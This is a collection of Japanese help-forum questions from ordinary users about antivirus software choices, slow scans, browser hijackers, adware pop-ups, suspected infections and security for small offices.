　マカフィーセキュリティーセンターを使用しています。 　それほど頻繁では有りませんが、３０分程でしょうか、mcshield.exeが動き続け、CPUパワーを３０％ほど消費し続けることが有ります。これはこれで問題ですが、その時相当なディスクI/Oが発生しています。ＰＣ前面のランプの点き方とアクセス音を観察すると、ディスク装置の耐久テストをしているのではないかと思うほどです。 　ＰＣのMPUはＩ３で１．９Ｇｈｚ．４スレッド　メモリーは４ＧＢ　　ＨＤＤは５００ＧＢ　　ＳＳＤ３２ＧＢ 　この時動いているプロセスは２つ有り次の通りです。 　(1)mcshield.exe PID=2700　ディスクＩ／Ｏが激しい時ＣＰＵを３０%程度消費。 　 Ｉ／Ｏ読取回数４，８６９，０５２　同読取データサイズ２７７，０７２，２５８，５８８。スレッド数５１。 　(2)McSaveHost.exe PID=9820　これもそこそこＩ／Ｏ回数有り。それにスレッド数１３０個。 　ＰＩＤ２７００は約５００万回Ｒｅａｄを掛け、２７７Ｇバイト読み込んでいます。Ｗｒｉｔｅ回数はざっとＲｅａｄ 回数の１０分の１で、サイズは６００分の１で４５０ＭＢ程です。 　ＨＤＤは５００ＧＢと書きましたが、エクスプローラーに依れば現在使用しているのはざっと６４ＧＢ程度です。と言うことは何故か使用しているバイト数の４倍の２７７ＧＢもＲｅａｄを掛けている事に成ります。 　又、エクスプローラーで表示される使用サイズは、恐らく全セクターがフルにデータが詰まっていると見做しているでしょうから、実際に読み込まれるデータサイズは１割や２割は小さいと思われます。（もっと小さいのかもしれません） 　私が不審に感じるのはスレッド数が大きい点です。ＨＤＤ対象に多数のスレッド（本来この数だけ、のプロセス)が平行して動いているなら、恐らくランダムアクセスでディスクのヘッドは動き回っていると思われます。１スピンドルのＨＤＤに数十ものランダムＩ／Ｏを掛ければ、シーケンシャルＩ／Ｏの何十倍も時間が掛かり、Ｉ／Ｏの都度消費されるＣＰＵパワーも馬鹿になりません。 　私の疑問は「何を根拠にこれほどのスレッドを発生させているのか」です。 　ひょっとして４～５個程度,多くても１０個未満のスレッド数にした方が、反って時間が短くなるのではないでしょうか？当然その改造にはプロセスの優先度を低くする必要も有ろうかとも思います。 　これが気になる理由は前記の通り、実際のディスク使用量の何倍ものデータを読み込んでいる一方、書き込みデータ量が非常にに小さい。と言いうことは、仮想メモリーのページファイルのスワッピングの為のＩ／Ｏを疑っているのです。尚、メモリーは４ＧＢ有りますから１ＧＢ以上遊んでいます。 　マカフィー社関連の方、宜しくお願いします。
総勢１０名ほどの工事関係の小さい会社に勤めています。 私はパートですが、あとのみなさんは社員です。若い人はいない会社です。 私が入社したのは最近ですが、会社のＰＣにセキュリティソフトが入っていないことがわかりました。 上司に言うと、入れなきゃいけないのはわかっているけれど忙しくてそのままになっているので安いソフトなどを探してみてほしい　と言われました。かなり最近までアナログだった雰囲気です。 個人用ソフトでは危険だろうとあちこち見積もりをとったりして、シマンテックの「エンドポイントプロテクション　スモールビジネスエディション」というクラウド型のセキュリティが一番安かったので、試用期間が１か月ありそれを私のＰＣに導入しました。 そのあと隣の席の「会社では一番ＰＣに詳しい（個人で使用するレベルですが）方」のＰＣも導入して様子をみていました。 するといつもホームネットワークを使ってファイルの共有をしていましたが、隣席の方のＰＣがホームネットワークに入れなくなってしまいました。 クラウドの画面上でファイアーウォールの設定を変え、ファイルの共有をはかったのにです。 結局導入していないＰＣ上に共有ファイルを設置することで仕事に支障はなくなりましたが・・ ここで試用期間が終わってしまいました。 ２人のＰＣに入れてみて、ウィルスの検知は0のまま１か月が過ぎました。 私的には個人用ソフトより安くてＰＣが重くならないこのクラウド型セキュリティが一番いいのではないかと思っていたのですが、ＰＣについて個人レベルの知識の人が私を含めて２人しかいないので、今後のトラブル発生時にどうなるのか不安に思っています。 設定時わからないことがありシマンテックのサポートに電話してみたのですが、カタコトの日本語を話す外人さんで、こちらの言ったことがうまく伝わらずほしい回答が出てこなくてあきらめて切る　ということもあったため、いまいち踏み切れません。 会社のみなさんは「大手のサイトしか見ないから」と（関係ないと思うのですが：笑）あまりセキュリティの必要性を感じていないようですが、経理のファイルや案件管理のファイルが消えてしまったらどれだけ怖いか・・ 長く勤めたいと思っているので、自分のためにも導入してしまいたいのです。 パートがでしゃばってると思われるのも切ないのですが。 みなさんだったら自分が完全には使いこなせない（シマンテックの簡単なマニュアルのみ　しかも英語を訳した理解しずらい日本語の説明）ものでも導入を進めますか？ それとも違うものを考えますか？（ＰＣ１１台で金額的にはシマンテックのものはＯＫもらっている。３年契約で１年あたりの一台の価格が3000円ちょい） 何かよい考えがありましたらご教授ください。 別商品を紹介いただいてもうれしいです。 （マカフィーは断られており、トレンドマイクロは見積もり金額が高かったです） 頭の固いおじいさん社長が納得する説明も考えないといけないと思うと気持ちも重いですが・・ よろしくお願いいたします。
本日、avast!無料アンチウィルスにアップグレードを促されたので実行しました。 2014.9.0.2021 その後、IE10でゆうちょ銀行にログインが出来なくなりました。 ログインボタンを押すと右下に～～から～～を開きますか？のダイアログが出ます。 ファイルを開くボタン、保存ボタン、キャンセルボタン。 どのボタンを押しても先に進めません。 今までこのようなダイアログは出ていませんでしたので不安に思います。 ヤフオクの取引ナビにも進めませんでした。 ヤフオクはFirefoxで取引できますがゆうちょ銀行はFirefoxが使えませんので困っています。 avast!をアップグレード後に出た不具合ですのでこれを削除するしかないのでしょうか？ それとも、ウィルスに感染しているのでしょうか？ 困っているのでお助け願います。
トップページはYhoo Japanでしたが、いつの間にか hao123が表示されるようになりました、これを消去するにはどうしたらいいでしょうか、インターネットオプションやプログラムを見ても、それらしいものの名前はありません、
ホームページを検索していたら突然次の二つのアイコンがデスクトップに出来てしまいました。 一つはContnueFileOpener もう一つはPennyBee 削除したいのですが対処法を教えて下さい。 お願いします。
現在、ウィルスバスターをいれているのですが、期限が、切れるので、 これを機会に、何か、安くて、いいソフトがないかさがしています。 ウィルスバスターは、アンチウィルスとファイアーウォールの２つの機能があるようですが、 漠然としか、このふたつの内容についてわからないので、おたずねします。 ファイアーウォールのみの機能がついたソフト（例えばzone alarm) などは、ネット閲覧などのウィルスの駆除はしてくれないと言うことになるのでしょうか？ また、そうだとしたら、別に、ウィルス駆除のソフトをいれた場合、一緒に、常駐するような 事は、無理ですよね？
ANDROIDタブレットを使用していますが、しばらく前から、時々、画面の右上部に変なアイコンが点滅するようになりました。 なにか変なアプリが起動しているのか不安ですが、設定のアプリで確認して見ても、特に変なアプリが立ち上がっているようには思えません。 ついては、何のアイコンなのか、お分かりの方は教えて頂けるようにお願い致します。
1週間ほど前から、IE（Ver.11）を起動すると（新しいタブを開く時も）、毎回以下のRunDLLメッセージが出ます。 C:\Program Files(x86)\Music Toolbar\Datamngr\apcrtldr.dllを開始中にエラーが発生しました。　アクセスが拒否されました。 OKボタンしかないので、OKをクリックすると普通にIEは閲覧できます。 １）念のためウイルスセキュリティZEROでウイルスチェックをしたところ、上記ファイルにウイルスが発見されましたが、削除・駆除・隔離いずれも「できません」となります。 ２）システムの復元を試みましたが、「システム復元は完了しませんでした」「ファイルへのアクセスが出来ません」という結果になります。 上記ウイルスを駆除する方法はありますでしょうか？。 ３）Windows Updateで重要な更新をしようとしたら、再起動した際に「システムの構成に失敗しました」「更新をもとに戻します」となってしまいます。これも上記ウイルスが関係しているのでしょうか。 使用PCはNECノートパソコンLS150/F、OSはwiondows7です。 宜しくお願いします！
最近ＰＣの調子が悪くて困ってたので、調べてみるとＣＰＵの使用率が常時１００％を表示していました。 これはウイルスにかかったのかなと思い、ウイルスチェックを数回してみるもウイルスはいないと表示されます。 ＣＰＵの使用率の大半をRegSvcs.exeというものが使用するのですが、これはウイルスなのでしょうか？ もしそうならどのように対処すればよろしでしょうか？ ウイルスチェックにはMicrosoft Security Essentialsとウイルスバスタークラウドを使用しました。
XPのサポートが終了して結構経ちますが未だにネットにつないでおります。 先のことは別として今現在何か問題があるでしょうか？
パソコン初心者です。パソコンを購入した（引っ越しの手続きをした際にネット回線のお願いをしたらパソコンが付いてきた)のですが、初めのころは特に何も問題なく使っていました。 しかし、パソコンを使って数か月たった今、パソコンを起動するたびに「問題を検出しました」という女性の声がするのです。 何も操作していなくてもパソコンがパソコン本体？の問題をそれぞれのツールごとに検索して問題点の数を提示してきます。 ほんとにパソコン初心者で右も左もわからないのですが、パソコンを守るためのセキュリティソフトがあるということを知ったので、おすすめのモノがあれば教えてください。 一度無料体験版というのをダウンロードしたのですが、設定の仕方がいまいちわからず使用しているのかいないのかわからないまま体験期間を終えてしまいました。 無料でも有料でも構いません。超初心者の私でも理解して使えるソフトを教えてください。
Bitdefenderは最強ですか？ カスペルスキーよりも強いですか？ｗｗｗ
ウイルス対策ソフト「ウイルスバスター」でこの価格は安いと思いますか?アマゾンなどと比べていただけると幸いです。 https://vbshop.trendmicro.co.jp/material/2719000 …
vista使ってます。 先日体験版ゲームのダウンロードで海外のミラーサイトから引っ張ってきて それをインストールする際にPCのリフレッシュ？だかパフォーマンス向上するソフトも一緒にインストールしてしまったらしく それが原因かどうかわかりませんが、youtubeや普通にブログなどを見ていると 画面下方に3つ出てきてかなりウザイです。 どうすればいいでしょうか？全くわからないので教えてください。 広告欄の端っこに uniblue　とかいう名前があり調べると会社名らしいですが削除方法がわかりません。 「あなたのPCはクラッシュ寸前です！」とか「今すぐインストールしてください」とか脅し文句をかけられてます。
以前ソースネクストのZEROを使ってましたが、ダウンロードができなくなり、動画も見れなくなったので、削除しました、いま何もウイルス対策していません。ZEROと同程度の無償ソフトありますか？できれば軽くて解かりやすいのがいいのですが、そんなのありますか？
さきほど、このごろｐｃの調子がわるかったので　工場出荷状態にもどしました 　まず先に、これまで利用していた　ａｖｉｒａアンチウイルスの無料ソフトをダウンロードしたのですか 　　日数制限が設けられたらしい表示がなされていたので　困っています 　次に思いついたのが　同じく無料版がある　avast!　というアンチウイルスソフトでしたが 　　どうやら、これも　”３０日”　などのカウントが見受けられます 　これまで通り、アンチウイルスソフトに　正直　お金を掛けたくないのですが・・ 　　どなたか、グレードは低くてもいいので　 無期限で使えるアンチウイルスソフト　ご存知ありませんか？ 　お知りの方がいたら、おしえてください　　よろしくお願い致します
ウイルス対策ソフトはライセンスにつき何台というのがありますよね？ それについてなんですが、一台目を使って、何年後かに2台目を使うことってできるのですか？ それとも、期限があって一台目使ってある一定の月日がたったら、2台目は無効化になるのですか？ 回答よろしくお願いしますm(_ _)m
ノートンを使っていますが、もう過ぎ期限切れの予告が表示されるようになりました。 同時にその先に、更新しますかという言葉が出てきて、先に進むとネットで更新できるらしいです。しかも今ならお安くしますとかというセールの文言も出てきます。 今までお店で買ってばかりいたのですが、どちらが良いのでしょうか。
困っているので、誰かおしえてください 状況としては OSは win7 64の自作機 TABを一定のタイミングで連打する キーボードを外しても同じ状況 キーボード入力確認ソフトで見るとどんな状況でもTABキー連打 という状況なのですが 該当するウィルスなどはあるのでしょうか？
他にも同じような質問があるのですが、どうしたらいいかわからずパニクっています＞_＜ 先ほどipadを開いたところ、受信メールのところにMail Delivery Systemから メールが送信できませんでした、のようなメールが数通届いていました。 メールを送った覚えはないのですが、もしやと思い迷惑メールフォルダをみたら 大量のfailure noticeがどんどん入ってきています。 ・送信元となっているのは、私のyahooのフリーアドレスです。 ・送信先はどれも知らないアドレスばかりですが、nao とかnanaなど、 日本の宛先のようです。 ・パソコンを持っていますが、もう一ヶ月ほど使用していません。 ipadがウイルスに感染したのでしょうか。 また私は女性ですので、いかがわしいサイトなどを覗いたこともありません。 （誰に全ての履歴を見られてもいいような状態です） どうしたらいいか途方に暮れています。 教えてください。
avgの無料のを使っています 以前使ってたavastのフォルダかファイルが感染してるらしく 修復するから再起動しろと言われます 再起動したら修復できていないらしく また再起動しろと出ます 再起動したら修復できていないらしく また再起動しろと出ます 再起動したら修復できていないらしく また再起動しろと出ます ・・・・・・ 治りません＾＾； 再起動しろがうっとーしくて消してもまた数十分後か、早くて2分後くらいに 画面のど真ん中に出てきます これ、どうしたらいいですか？
質問します。 インターネット初心者です。 インターネットのお気に入りの上に、Alexa?という検索窓があるのですが、いつ入れたのかもわからないし、これがヤフーの検索と何が違うのかわかりません。ウイルスですか？ どなたかAlexa？について知っている方いらっしゃいませんか？
アビラのフリーソフト(無料) Free Antivirus 2013を入れています。 インターネット保護が出来ていないところがあります。 Mail Protectinon、safeBrowsing、ゲームです。どうすれば保護されるようになりますか? OSはWindows 7SP1です。お願い致します。　 有料版でないと保護は出来ないのですか? 無料版でも出来るのてあれば保護出来るやり方を教えてくざさい。 すみません宜しくお願い致します。
AVGアンチウイルスのフリー版について質問です。今アバストを使っているのですがアバストだとライセンスを一年ごとに登録情報から手動で更新しなくてはいけないんですがAVGだと一年ごとにライセンスの更新とかやらなくてもいいのでしょうか？ どなたか教えてください。よろしくお願いします。
数日前にアダルトサイトを閲覧してた時、 突然一瞬だけ画面が真っ暗になり、すぐに戻りました。 それ以来、別に何もなく普段通りだったのですが、 先ほど、ネットを使用中突然画面が変わり、 強制シャットダウンしたので回復します。のようなメッセージが表示されました。 セキュリティソフトはＮＴＴフレッツ標準のもので、 見ると「最新の状態で保護されています」と表示されてますが、 週１ぐらいで立ち上げた時に「最新版にアップデートして下さい」とも表示されます。 指示通り操作をすると「最新版なので必要ないです」みたいな結果になります。 こんな症状なのですが、ウィルスにやられてないでしょうか。 最新版のセキュリティソフトならば安心していいものなのでしょうか。
私が入社した会社では10人位がパソコンを使用しており、メールも共有しているのですが、 今回、セキュリティーソフトを入れる事になり、どの製品が良いのか迷っています ３アカウントくらいの製品はショップで良く見るのですが10PCくらいあるので それも含めて、 今は（将来性も含めて）、どの製品がお買い得か教えてください。 メールとホームページ両方にセキュリティーが効き、できれば軽いのが良いです ウイルス等の危険性を考えると導入が遅いのは承知していますが、 将来的な指摘をいただけると嬉しいです。
パソコンを乗っ取られて誤認逮捕されて被害者面している人がいましたが、ウイルス対策をしてないということだから自業自得じゃないのですか？
コンピューターをクラックすることができるのははじめから仕様でローカルコンピューターをリモートできる機能がついているからなのですか。
最近になって、パソコン画面に“アダプタがスキャンされています”というポップアップが頻繁に表示されるようになりました。これはウィルススキャンソフトの“Avira Internet Security”によるもので、アダプタ名として接続中のダイヤルアップの名称が、スキャン元としてIPアドレスが、それぞれ付記されています。 長時間の光フレッツ接続で常用する私のパソコンは、サイバー攻撃の対象となっているのでしょうか。このまま“Avira Internet Security”のみに任せておいて大丈夫でしょうか。
先程、変なメールが届きました。すぐに削除したので正確ではないですが、 「誰かがあなたのアカウントを不正使用している恐れがあります。下記にアクセスして 確認を行ってください」というもので、聞いたことのない会社名が記されていました。 アカウントとかパソコンに詳しくないので全くわかりません。アドバイスよろしくお願いします。
初めて質問させていただきます。 パソコンのセキュリティをBBIQのサービスで無料でついてくるマカフィーに変えたのですが、ネット動作が一気に遅くなってしまいました。 買って10日ほどなのにもかかわらずネットのみフリーズ同然の動作です。タイピングも入力してからじわじわ反映される状態です。 無料製品版マカフィーを入れる前はそれなりにさくさく動いていたのですがダウンロード前のさくさく状態でのセキュリティソフトもマカフィー90日体験版です。同じマカフィーのはずなのに動作が全く違います。 以前のような動作にするにはどうすればいいのでしょうか。 パソコン初心者のため、必要なものとそうでないものがよくわかりません。 PCは富士通のFMVA56MBでOSはWindows8.1 マカフィーのバージョンは セキュリティセンター：12.8　アンチウィルスとアンチスパイウェア：16.8 パーソナルファイヤーウォール：13.8　サイトアドバイザー：3.7　アンチスパム：13.8 保護者機能：14.8　クイッククリーンとシュレッダー：12.8　脆弱性スキャナー：2.8
皆さんは、XPを使われてますでしょうか？ 僕は、ネット接続なしのセカンドマシンとして使っています。 ウイルスバスターを入れてるのですが、ネット接続前提での効果とのこと。 定期的にネット接続して最新の状態にすれば良いそうですが、全く接続しないと正常動作できないそうで。 全くネット接続しないので、削除しようと思ってます。対策内容の問いは、外部媒体に対してです。 USBメモリをXPに挿す前に、他のPCでスキャンすれば問題なしと。 スキャンを忘れることも考慮して、外部媒体対策専用のソフトなどは有るのでしょうか？ 有ったとしても定期的なアップデートは必要になるものと思われますが、一定期間をおいて最新版を再インストール。 この場合でもネット接続が必要なのか、それ以前にそんなソフトが有るのかどうか。 また、他に有効対策が有れば教えていただきたいです。宜しくお願いします。
フォルダー、ファイルの情報の表示だけで感染しますか -------------------- ○ フォルダ内のファイルの一覧の表示設定で　詳細　を選択した時 フォルダ内にあるファイルの 更新日時,種類,サイズ　 フォルダ内にあるフォルダの更新日時,種類 が表示されます。 ○ フォルダーオプション→表示 の フォルダーとデスクトップの項目の説明をポップアップで表示する フォルダーのヒントにファイルサイズ情報を表示する ○ フォルダーまたはファイルアイコンのところで右クリック→プロパティ を選択 -------------------- フォルダーまたはファイルの情報を表示させる方法として上記のような方法が思い当たります。 ウィルスを含んだ実行ファイルを実行して感染、ウィルスファイルを関連付けられたアプリケーションで開いて感染というのは理解できますが 上記のような方法でフォルダーまたはファイルの情報である更新日時やサイズなどを表示させるだけでウィルス感染することがあるのでしょうか？ 仮にあるとしても、このタイプのウィルスファイル、ウィルスフォルダはほとんど存在せず気にしなくてもよいでのしょうか？ 今までは危険そうなファイルをダウンロードしてしまっても、実行しなければ または 関連付けられたアプリケーションで開かなければ問題ないと考えていましたが フォルダーまたはファイルの情報を表示させるだけでウィルス感染するなら話が変わってきてしまいます。
３月末にパソコンを買い換えました。無料３か月が終わりになるので、家族のウイルスバスターをインストールしたいです。CDを入れましたが、作動しません。どのようにしたらよいですか。 家族の２人の空きがあります。有効期限内です。
お世話になります。 Windows8.1を起動したところ、今日の今しがたから、デスクトップの右下に、 全く見たこともないゲームのインストーラーが表示されています。 現在も消えることなく、画面に出たまんまです。 英語表記だし、メーカー名も書かれていないため、あからさまに『怪しい』ものだと 判断しました。 画像を添え付けいたしますので、これの正体と削除方法、後解れば どのような経緯で入ってくるものなのか、教えていただけますよう お願いいたします。 仮にウイルスなどの悪意のあるものでないにしても、迷惑であることには 違いないので、対策をお願いいたします。 以上、よろしくお願いいたします。
リンク切れとなんですか？
Ａｃｔｖｅｒｉｓ　Ａｎｔｉ　Ｍａｌｗａｒｅというソフトがいつのまにかインストールされています。 何か他のソフトとセットでインストールされたようですが、記憶がありません。 このままで大丈夫かどうか教えてください。 また、深刻な問題が検出された処理を促すようなメッセージもあります。 このまま指示に従って処理をしていいのかも含めよろしくお願いします。
http:// www.flopdesign.com/fonts/flopfont/yakitori.html
よく、ウイルス対策ソフトなどが起動して、「レジストリをスキャンする」とか「レジストリの最適化」という表示を目にしますが、その意味が理解できません。 関連サイトを見てもあまりよくわかりませんでした。 まず、「レジストリ」の意味と、「レジストリスキャン」とか「レジストリ最適化」の意味を、わかりやすく教えていただけましたら幸いです。 基本的な質問で申し訳ありませんが、よろしくお願いします。
http://www.flopdesign.com/fonts/flopfont/yakitor … このサイトは安全ですか？ ご回答頂ければ幸いです
使っているソフトに脆弱性があると、ウイルス対策ソフトを使っていても駄目なのだそうです。 何故でしょう？
win7でウイルスソフトのAVG freeを使っています。 ネットサーフィン中にウイルスを検出した（感染した？）ようで 強制再起動になりました。 それからAVG freeがタスクバーに表示されなくなりました。 タスクマネージャーには書かれてあるので、起動はしているようです。 更にAVGのウインドウを出すためにexeファイルを起動しようとしたのですが 権限がない、というようなダイアログが表示され起動することができませんでした。 以前にもこのような現象があり、対処方法が分からず、 OSをリカバリするはめになりました。 AVGだけでなくウイルスバスターの時にも同じようなことがあったように思います。 これは何が原因でどのようにすれば改善されるのでしょうか？
自分のPCにはjava 7 Update 55とjava (TM) ７ Update5 (64bit)が入っててjava (TM) ７ Update5 (64bit)は旧バージョンで古いからアンインストールするように言われ、アンインストールしました。 そしてjavaのサイトにてjavaの有無のチェックに行き、javaのバージョン確認をしてVersion 7 Update 60と表示されたんですがこれでjavaは完璧ですか？ (写メの状況) 普段よく使うfirefoxのプラグイン設定のとこにある赤字の注意書きがあるJava Deployment Toolkit (click-to-play)7.0.600.19 10.60.2.19は無効設定にしてもう一つのJava(TM) Platform SE 7U60 10.60.2.19だけを有効にしてればいいんですよね？ NEC LaVie Windows８　型番PC-LE150JSP2
今日、買ってきた外付けHDDをさしたらウイルス検出され autorun.infとウイルスがノートンで検出されました。 外付けＨＤＤのLaCieというやつで、型番はLCH-FMN020U3です。 　 これは元から入ってるので安全という事でしょうか？
自分のＰＣにはJava SE Runtime Environmentで入れたjava 7 Update 55とjava (TM) ７ Update5 (64bit)が入ってるんですがjava (TM) ７ Update5 (64bit)は旧バージョンで古いと言われアンインストールを進められたんですけどjava 7 Update 55だけ入ってれば良いんでしょうか？ javaのサイトでバージョンを調べると推奨バージョンのJavaがインストールされています (Version 7 Update 60).と表示されるんですがそれでも旧バージョンのjava (TM) ７ Update5 (64bit)のアンインストールは必要ですか？ NEC LaVie Ｗｉｎｄｏｗｓ８　型番PC-LE150JSP2
http://www.itmedia.co.jp/news/articles/1406/10/n … ウイルスバスターを最新の状態で使っていれば大丈夫でしょうか。
海外のサイトでZIPファイルをダウンロードしました。 ダウンロードしている最中、関係のないファイルのダウンロードもすすめられていることにきずき、途中でキャンセルを押しました。 しかし、遅かったようで、感染しました。 症状は ・ブラウザののっとり(Internet　Explorerを起動しようとするとv9.comが開く) v9.comのURL→ http://www.v9.com/?utm_source=b&utm_medium=adk&f … ・検索してる途中、右下から「KingIlya」などの情報が出てくる ・サイトを閲覧していると、頻繁にHD Video Playerが別のウィンドウで開かれる（以前はなかった） ・とても重い 対策 ・プログラムと機能から、ZIPファイルのダウンロードの際に、一緒にインストールしたものをすべて消したが、効果がない。 ・スタートページの検索欄で「v9」を入力し、ヒットしたファイルをすべて消したが、効果がない。 ・ウイルスソフトでスキャンしても、見つからず、修復できない。 ・バックアップは、パソコンを高速化する際にデータを消去したので、できない。 ・v9ウイルスについて、調べたが、海外サイトでしか対応策が乗っておらず、日本語訳されてもカタコトで説明がよくわからない。 パソコン ・名前:Lenovo IdeaPad U350 ・ＯＳ:VISTA ・型号:2963 製品のURL→http://mobilesupport.lenovo.com/jp/ja/products/l … 出来れば、初期化したいのですが、 知り合いが言うには、専用のディスクが必要らしくて、自分はそれを持っていません。（付属していたかもしれないが、手元にない） 自分はパソコンに関して、全くのド素人です。 パソコン・情報に詳しい方、ウイルスの消し方、既定のブラウザの変え方、あるいは初期化の方法を教えてください。
しばらく使っていなかったパソコンの、ウイルスソフトの期限が過ぎてしまっていました。 その間のせいか分かりませんが、パソコンを付けて、パスワードを打ち込む画面で勝手に認証→認証できませんでした→パスワード打ち込みが1秒ほど表示→また勝手に認証を繰り返しました。 それをF8？かなにかのボタンを起動時に連打するという方法で突破し、起動したかと思ったら、メールが勝手に開く→閉じれない→インターネットが勝手に開く→bingが大量出現→消せない→さらに出る これを繰り返しました。 結局、初期化をしました。 しかし、起動時にはやはり勝手に認証画面に… それを突破したら、以前みたいにメールが開くこともなく、bingが勝手に開くこともなくなりました。 しかし、文書ソフトを開いていたら、1行改行したら、半分くらいまで勝手に改行します。 前よりは遥かにマシですが、インターネットの画面が勝手に開いたりします。 初期化した時にウイルスソフトも入れています。 これは何が原因なのでしょうか？
IPアドレスを抜かれてしまうと、住所や名前、パソコンに保存してある情報とかわかっちゃうんですか？
私のWindowsXPのタスクマネージャのプロセスに、 csrss.exeが2つ、iexplore.exeが2つ、svchostが7つあったのですが、これはウィルスでしょうか？
ソースネクストのウイルスセキュリティーZeroの検出性能は良くないのですか？ マカフィー社製と書いてありましたが。 どうでしょう？
遠隔操作のウイルスのあるＵＲＬを2ｃｈに貼り付けて、そのＵＲＬを見るだけで遠隔操作ウイルスに感染するのでしょうか？ 2ｃｈに貼られてるＵＲＬの度々行くのですが、たまに何も書かれてない白紙のＵＲＬがあります。 ああいうのがまさにコンピューターウイルスなのでしょうか？ 自分のパソコンがウイルスに感染してるかどうか、判るのでしょうか？ 現在ＡＶＡＳＴの無料バージョンを使ってますが、感染したと言う警告はありません。 片山被告の作成した遠隔操作のウイルスに感染したＰＣも、恐らくアンチウイルスソフトはインストールされてったでしょうから、そのようなソフトも高度なウイルスにとっては全くの無力なのでしょうか？ 2ｃｈに貼られてるＵＲＬは危険なのが多いのでしょうか？
goo　で受信時（gmailでは大丈夫）、 添付ファイルがワード（テキストでも同じ）の場合 例えば 添付2014.4.AFガイド.docx (242k をクリックし、 ダウンロードしたファイル名を見ると、 2014AF漢字（日本で使われていない）カタカナ漢字（日本で使われていない）,漢字（日本で使われていない）・docx となっている。 その他のワード添付例でも 数字やアルファベットはそのままで、漢字（日本で使われていない）カタカナの交互になり・docx、となっている。 Norton　を入れてます。
ソースネクスト社から、2014/6/5-19:33付けで次内容のメールが届きました。 「報道されているバッファロー社のダウンロードサイトに混入されたウイルスに、下記の通り対応していますので、お知らせいたします。」 (以下、示されているのは製品名だけ、略) 一方、当のバッファロー社からは、6/2に既に以下を受領済み。 「改ざんファイルがダウンロードされた可能性があるのは、5月27日の6時16分～13時。改ざんされていたファイルは以下の通り。 」(以下、略) ソースネクスト社からの通知は、「対応を完了しました」ではなく「対応しています」となっているので、 「何時から対応しているのだ、それが重要だ」と文句をいいたい所です。 実際はどうなのでしょうか? #### 数年前、ソースネクストのセキュリティZEROを購入したがあまりの重たさにすぐ止め、関係届けも全て廃棄したので質問権利がなく、こちらにお伺いさせて戴きました。 まさか事前対応は無いと思うので、こんな遅い対応を自慢げに通知するなとも言いたい…対応遅れや連絡遅れの侘び言葉は一切ないし…
bitdefenderってものすごく高性能なんですか？
みなさん、こんにちは。 Googleなどの検索サイト使って「中国」、「チップ」、「バックドア」の3語のアンド(and)検索やってみて下さい。 非常にえげつないことやってる国ですよね。最近の中国は度が過ぎていますよね？ 日本は大丈夫なんですか？
出所不明なプログラムを実行したり、怪しいサイトに行ったりしなければウイルスには感染しないでしょうか？
改ざんされて、ウイルスを仕込まれるってことあるんでしょうか？
よろしくお願いします。 60人程度の企業の総務担当です。 一人につき一台のPC（Windows7およびVista）を支給していますが 予算の関係でメーカーも機種もまちまち、セキュリティ対策はフリーソフト 頼っているのが現状です。 このような環境のなか、先日トレンドマイクロの営業の方から セキュリティ対策について提案を受けました。 「ウイルスバスター ビジネスセキュリティサービス あんしんプラス」 という商品です。 一台あたりの月額料金も安く、話としては悪くないのですが、導入してから 不安定になったり仕事に影響が出ると本末転倒だと懸念しています。 「ウイルスバスター ビジネスセキュリティサービス あんしんプラス」 の評価。 それからこれ以外にもおすすめのセキュリティ対策ソフトがあればメリットデメリットも 含めて教えていただければ助かります。 予算は具体的にいくらまで、というのはありませんが低価格に越したことはないです。 「すべてではないですが、一般的な『安かろう悪かろう』、の認識はあるつもりです」 できれば実際に導入している企業様のご意見をお伺いしたいです。 よろしくお願いします。
Windows8.1でウイルス対策ソフトはカスペルスキーを使用している者ですが、質問です。 コントロールパネルのアクションセンターのセキュリティの項目によると、「ウイルス対策」と「スパイウエアと不要なソフトウエアの対策」がwindows　Defender　もカスペルスキーも両方とも無効になっています。 「インストールされてるウイルス対策アプリ」を表示してカスペルスキーを選択して「有効にする」をクリックしてもいっこうに有効になりません。別途、カスペルスキーのソフトを立ち上げて設定をみてみるとすべての項目がオンになっているはずなのですが・・・。 ちなみになぜかwindows　Defenderは有効にできるので、「ウイルス対策」と「スパイウエアと不要なソフトウエアの対策」に関しては今はカスペルスキーは無効、windows　Defenderは有効にしています。 また、ネットワークファイアウォールはカスペルスキーが有効になっています。 以前はすべてカスペルスキーが有効でwindows　Defenderは無効の設定になっていたと思うのですが、最近異変？に気づいたので質問させていただいた次第です。 わかりにくい文で恐縮ですが、どなたか教えてくださると幸いです。
〖Malwarebytes' Anti-Malware ver 2.0〗をインストールして使おうとしましたが、スキャン開始後まもなくきれます。何度やっても同じです。ｘｐだからでしょうか。１０年前の仕様のハードです。
デスクトップ上に【desktop.ini】というメモ帳が一つありました。再インストールする前にもあったのですが、何度も削除して再起動しても、どうしてか再び復活して完全に消えません。デスクトップ上に一番最後のアイコンの後に必ずくっついています。これは何かのウイルスですか？再インストールしたのに消えませんでした。どなたか詳しい方教えて下さい。
Panda Internet Securityはつおいの？　　　　　^^
ウィルスバスターの新バージョンを購入し 従来使用していたシリアル番号での更新を完了しました。 しかし、 「更新期日が近づいてきています」などのアップ画面で広告が出てきます。 更新されて、ちゃんと制御されているか確認するには どうすればいいでしょうか？
ESET　Smart　Security5.2がパソコンにインストールされています。 ＩＥの脆弱騒動があり、このバージョンで大丈夫なのか心配に なりました。 使っているセキュリティソフトは最新バージョンにアップした方が 良いと言われていますが、5.2よりも最新バージョンにアップした 方が良いでしょうか。
私はセキュリティーソフトとしてAviraをいれています。 最近JS/RedirectorというものがURLタイプで検出され、アクセス拒否を行ったのですが何度も何度も検出されます。 ソースはttp://long-shore.com/api/services/format/jsonで、毎回同じソースです。 （hは抜きました。私はこのURLは踏んでいません。踏んで何があっても私は知りません。） AviraでスキャンをかけましたがPCでは何も検出されませんでした。 いい加減ピコピコうるさいのとここまで連続して検出されるとウィルスに掛かっているのではないかと心配です。 このような場合どうすればよいのでしょうか。
某都市銀行の「ルパート」というウイルスソフトをダウンロードしようと思っています。 使い勝手とか、重さとかどんな具合ですか? そこそこ使えるんでしょうか?
